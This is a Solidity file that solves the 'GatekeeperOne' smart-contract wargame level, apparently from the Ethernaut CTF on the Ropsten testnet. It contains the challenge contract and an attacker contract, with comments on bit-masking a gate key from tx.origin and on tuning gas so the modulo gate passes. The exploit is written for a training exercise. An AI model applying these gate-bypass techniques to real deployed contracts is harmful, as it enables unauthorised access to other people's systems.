pragma solidity ^0.4.23;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    /*
    Calculate your gas by checking in debugger
    First, run in JavaScriptVM (in line 67, replace the instance address with "new GatekeeperOne()")
    Check the opcodes in "Instructions"
    At the moment the debugger highlights "msg.gas % 8191", take note of the operation step 
    Then, deploy in ropsten (remember to replace the "new GatekeeperOne()" with the instance address)
    After you run the "kill" function, check the Geth DebugTrace function at Ropsten Etherscan (Click on the ropsten link)
    Check the amount of gas consumed and left, do the mathematics to derive the appropriate gas to pass in
    */
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract GatekeeperOneKiller{
    address public txOrigin = tx.origin;
    bytes8 public gateKey = bytes8(txOrigin); //remember we need to enter a bytes8 gateKey
    /*
    Each bit in a solidity signature comprise of 2 characters
    At each position, F retains the same value, 0 masks it with ...0
    For Solidity, the first 4 bytes contain the function signature, so we do not mask it
    From 1st requirement,
    The idea is to mask the first 16 bits with 0s. 
    2 characters = 1 bytes
    4 characters = 2 bytes
    2 bytes --> 2*8 = 16 bits
    
    Solidity reads from the back, such that uint16 will read the last 4 chracters from the back.
    This means that we want the last 4 characters to be the same, but subsequently masked with 0 since padding pads 0s.
    hence we mask the following 4 characters with 0s
    From 2nd requirement, 32 --> 64 bits must be different, so we do not pad it any further, remaining at 4 0s (second 16 bits).
    From 3rd requirement, we derive gateKey from tx.origin since gateKey == tx.origin, so we use & bitwise operator
    */
    bytes8 public mask = 0xFFFFFFFF0000FFFF;

    bytes8 public exploit = gateKey & mask;
    
    uint32 public finalKey = uint32(exploit);
    uint16 public midKey = uint16(exploit);
    uint16 public finalOrigin = uint16(tx.origin);

    GatekeeperOne target = GatekeeperOne(0x274743545071c7b4a21f0f7b364469606f54b4d3);

    function kill(){
        target.call.gas(64743)(bytes4(sha3("enter(bytes8)")),exploit);

    }
}

